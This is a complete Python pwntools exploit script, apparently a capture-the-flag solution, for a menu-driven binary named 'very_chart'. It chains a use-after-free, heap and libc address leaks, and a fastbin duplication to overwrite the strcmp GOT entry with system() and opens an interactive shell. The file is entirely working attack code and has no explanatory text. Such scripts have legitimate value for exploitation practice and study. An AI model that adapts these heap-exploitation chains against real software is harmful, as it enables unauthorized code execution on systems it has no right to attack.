from ntpwn import *

s = process('./very_chart')
e = ELF('./very_chart')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def regi(_type, _id, _pw, _name,_profile = ''):
	s.sendlineafter('>','2')
	s.sendlineafter(':',_type)

	s.sendlineafter(': ',_id)
	s.sendlineafter(': ',_pw)
	s.sendlineafter(': ',_name)

	if _type == '2':
		s.sendlineafter(': ',_profile)

def login(_id,_pw):
	s.sendlineafter('>','1')
	s.sendlineafter(':',_id)
	s.sendlineafter(':',_pw)

### USER ####
def create(name):
	s.sendlineafter('>','1')
	s.sendlineafter(':',name)

def delete_box(idx):
	s.sendlineafter('>','2')
	s.sendlineafter(':',idx)

def buy_music(idx):
	s.sendlineafter('>','3')
	s.sendlineafter(':',idx)

def put_box(boxidx,musicidx):
	s.sendlineafter('>','4')
	s.sendlineafter(':',boxidx)
	s.sendlineafter('> ',musicidx)

def box2box(boxidx1, boxidx2, x, y):
	s.sendlineafter('>','5')
	s.sendlineafter(':',boxidx1)
	s.sendlineafter(':',boxidx2)
	s.sendlineafter(':',x)
	s.sendlineafter(':',y)

def delete_music(idx):
	s.sendlineafter('>','8')
	s.sendlineafter(':',idx)

def boxlist():
	s.sendlineafter('>','6')

def musiclist():
	s.sendlineafter('>','7')


def user_exit():
	s.sendlineafter('>','9')

### COMPOSER ###
def write(name,lyrics):
	s.sendlineafter('>','1')
	s.sendlineafter(':',name)
	s.sendlineafter(':',lyrics)

def delete_song(idx):
	s.sendlineafter('>','2')
	s.sendlineafter(':',idx)

def edit_profile(profile):
	s.sendlineafter('>','3')
	s.sendlineafter(': ',profile)

def edit_music(idx,lyrics):
	s.sendlineafter('>','4')
	s.sendlineafter(':',idx)
	s.sendline(lyrics)

def composer_exit():
	s.sendlineafter('>','5')

com = ['NEXTLINE', 'NEXTLIN1', '/bin/sh\x00']
user = ['USERUSER']

regi('2',com[0] , 'A' * 8, 'B' * 8, 'C' * 8)
regi('1',user[0] , 'A' * 8, 'B' * 8)

login(com[0], 'A' * 8)
write('A' * 0x18, 'B' * 0x37)
write('A' * 0x18, 'B' * 0x37)
composer_exit()

login(user[0], 'A' * 8)
create('A' * 8)
buy_music('0')
buy_music('1')
put_box('0','0')
put_box('0','1')
delete_music('0')
user_exit()

login(com[0], 'A' * 8)
delete_song('0')
composer_exit()

# uaf
login(user[0], 'A' * 8)
box2box('0','0','0','0')

# heap leak
create(p64(0x607340))
boxlist()
s.recvuntil('Lyrics : ')
heap = u32(s.recv(4).replace('\x31','\x00'))
log.info("HEAP : " + hex(heap))

# libc leak
box2box('0','0','1','2')
delete_box('1')
box2box('0','0','1','3')
box2box('0','0','1','4')
create(p64(0x6051c0))
boxlist()
s.recvuntil('Lyrics : ')
libc = u64(s.recv(6) + "\x00" * 2) - 0x959988
oneshot = libc + 0x4526a
log.info("LIBC : " + hex(libc))

# fastbin dup
delete_box('1')
box2box('0','0','1','5')
box2box('0','0','1','6')
create(p64(heap + 2464))
create('A' * 0x67)
create('A' * 0x67)
user_exit()

regi('2',com[1] , 'A' * 8, 'B' * 8, 'C' * 0x30)
login(com[1], 'A' * 8)
write('A' * 0x10, 'F' * 0x37)
edit_profile(p64(heap+32) + p64(heap+1728) + "\x00" * 0x20)
composer_exit()

login(user[0], 'A' * 8)
delete_box('0')
user_exit()

regi('2',com[2] , 'A' * 8, 'B' * 8, 'C' * 0x27)
login(com[2], 'A' * 8)
edit_profile(p64(e.got['strcmp']) * 2)
composer_exit()

login(com[1], 'A' * 8)
edit_music('0', p64(libc + l.symbols['system'])[:-2])
composer_exit()

login('PWN','NEXTLINE')
for i in xrange(3):
	s.recvline()
s.interactive()
